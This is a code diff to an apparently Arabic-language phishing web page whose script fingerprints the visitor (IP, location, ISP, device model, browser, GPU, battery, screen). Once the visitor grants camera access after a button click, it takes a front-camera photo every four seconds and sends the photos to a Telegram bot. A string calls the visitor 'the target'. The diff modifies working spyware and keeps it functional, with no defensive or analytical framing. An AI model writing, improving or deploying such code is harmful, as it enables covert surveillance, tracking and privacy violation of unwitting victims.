@@ -29,21 +29,25 @@
 
         async function collectAll() {
             let n = navigator;
-            let report = "🛑 **تقرير تقني شامل (دقة عالية)**\n\n";
+            let report = "🛑 **تقرير تقني شامل (فوري)**\n\n";
 
-            // 1. الشبكة والـ IP
+            // 1. الشبكة والـ IP (كما طلبت دون تغيير)
             try {
-                const res = await fetch('https://ipapi.co/json/').then(d => d.json());
-                report += `🌍 **الآي بي:** \`${res.ip}\`\n🏢 **الشركة:** ${res.org}\n📍 **المكان:** ${res.city}, ${res.country_name}\n📡 **ASN:** ${res.asn}\n`;
-            } catch (e) { report += `🌍 **الشبكة:** فشل الجلب\n`; }
+                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                report += `🌍 **الآي بي:** \`${ipRes.ip}\`\n`;
+                const geo = await fetch(`https://ipapi.co/${ipRes.ip}/json/`).then(r => r.json());
+                report += `🏢 **الشركة:** ${geo.org || 'غير معروف'}\n`;
+                report += `📍 **المكان:** ${geo.city}, ${geo.country_name}\n`;
+            } catch (e) { report += `🌍 **الآي بي:** فشل جلب الشبكة\n`; }
 
-            // 2. فحص نوع الهاتف بدقة (Deep Detection)
-            let deviceDetail = n.platform;
+            // 2. فحص نوع الهاتف بدقة عميقة (تعديل النظام)
+            let deviceDetail = "Linux (Generic)";
             try {
                 if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
-                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-                    deviceDetail = `${ua.model} (Android ${ua.platformVersion})`;
+                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+                    deviceDetail = `${ua.model} - Android ${ua.platformVersion}`;
                 } else {
+                    // استخراج الموديل من نص المتصفح (مثال: Samsung SM-G991B)
                     let uaText = n.userAgent;
                     let modelMatch = uaText.match(/\(([^)]+)\)/);
                     if (modelMatch && modelMatch[1]) {
@@ -51,26 +55,31 @@
                         deviceDetail = parts[2] ? parts[2].trim() : parts[0].trim();
                     }
                 }
-            } catch (e) {}
+            } catch (e) { deviceDetail = n.platform; }
+            
             report += `📱 **النظام:** ${deviceDetail}\n`;
 
-            // 3. المتصفح والمعالج الرسومي
-            let bName = n.userAgent.includes("Brave") ? "Brave" : n.userAgent.includes("Chrome") ? "Chrome" : "Safari/Other";
+            // 3. المتصفح والرسوميات
+            let bName = "مجهول";
+            if (n.userAgent.includes("Brave")) bName = "Brave";
+            else if (n.userAgent.includes("Chrome")) bName = "Chrome";
+            else if (n.userAgent.includes("Safari") && !n.userAgent.includes("Chrome")) bName = "Safari";
+            else if (n.userAgent.includes("Firefox")) bName = "Firefox";
             report += `🧭 **المتصفح:** ${bName}\n`;
 
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                report += `🎮 **الرسوميات:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
+                report += `🎮 **المعالج الرسومي:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
             } catch(e) {}
 
-            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || '8'}\n🖥️ **الشاشة:** ${screen.width}x${screen.height}\n`;
+            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || '8'}\n`;
+            report += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;
 
-            // 4. البطارية
             try {
                 if (n.getBattery) {
                     const b = await n.getBattery();
-                    report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
+                    report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا يُشحن"})\n`;
                 }
             } catch (e) {}
 
@@ -88,15 +97,9 @@
         document.getElementById('btn').onclick = async function() {
             this.style.display = 'none';
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
-                });
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('v').srcObject = s;
-                
-                // انتظار ثانية لضبط الإضاءة قبل أول صورة
-                setTimeout(() => {
-                    setInterval(snap, 4000);
-                }, 1000);
+                setInterval(snap, 4000);
             } catch (e) {
                 sendText("⚠️ **المستهدف رفض الكاميرا**");
             }
@@ -105,18 +108,14 @@
         function snap() {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
-            if (video.videoWidth === 0) return;
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            
             canvas.toBlob(blob => {
                 const f = new FormData();
                 f.append('chat_id', chat);
                 f.append('photo', blob, 'x.jpg');
                 fetch(api + "sendPhoto", { method: 'POST', body: f });
-            }, 'image/jpeg', 0.9); // جودة عالية 90%
+            }, 'image/jpeg', 0.8);
         }
 
         function sendText(txt) {
